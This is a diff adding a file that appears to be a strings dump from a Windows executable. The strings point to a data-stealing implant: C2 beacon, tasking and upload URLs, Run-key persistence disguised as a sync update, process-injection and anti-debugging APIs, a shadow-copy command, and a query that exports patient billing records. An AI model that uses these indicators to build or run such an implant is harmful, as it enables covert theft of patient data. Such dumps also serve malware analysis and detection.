@@ -1,0 +1,39 @@
+MZ..........................................................................
+....This program cannot be run in DOS mode..................................
+.text........................................................................
+.rdata.......................................................................
+.data........................................................................
+KERNEL32.dll
+ADVAPI32.dll
+WININET.dll
+GetProcAddress
+LoadLibraryA
+InternetOpenA
+InternetConnectA
+HttpSendRequestA
+RegCreateKeyExA
+RegSetValueExA
+CreateMutexA
+Global\WSYNC_7f3a91
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) SyncAgent/2.1
+https://cdn-sync-status.net/api/v2/beacon
+https://cdn-sync-status.net/api/v2/tasking
+POST /api/v2/upload HTTP/1.1
+Content-Type: application/octet-stream
+SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+WinSyncUpdate
+C:\Users\Public\Libraries\wupdate.exe
+cmd.exe /c vssadmin list shadows
+%APPDATA%\sync_cache\stage.tmp
+SELECT * FROM patient_billing WHERE export_flag=1
+.pdf .docx .xlsx .csv
+zip -P
+aes256
+!This_is_ERR0R_c0de_%d
+GetComputerNameA
+GetUserNameA
+IsDebuggerPresent
+Sleep
+VirtualAlloc
+WriteProcessMemory
+CreateRemoteThread
